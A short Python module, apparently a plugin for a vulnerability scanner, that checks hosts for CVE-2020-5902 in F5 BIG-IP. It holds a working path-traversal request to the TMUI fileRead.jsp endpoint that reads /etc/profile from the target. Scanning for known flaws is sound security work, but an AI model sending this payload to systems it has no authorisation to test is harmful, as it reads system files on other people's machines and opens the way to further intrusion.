from .scan import Scan
import aiohttp
import traceback

class Cve_2020_5902(Scan):
    async def scan(self, session : aiohttp.ClientSession):
        vulns = []
        data = {}

        try:
            async with session.get(
                **{"url":str(self.ping.url)+"tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile"}, **self.request_args, timeout=2,
            ) as resp:
                if resp.status == 200:
                    text = (await resp.text())
                    if "System wide environment and startup programs" in text:
                        vulns.append("CVE-2020-5902")
        except Exception as e:
            pass

        return vulns, data
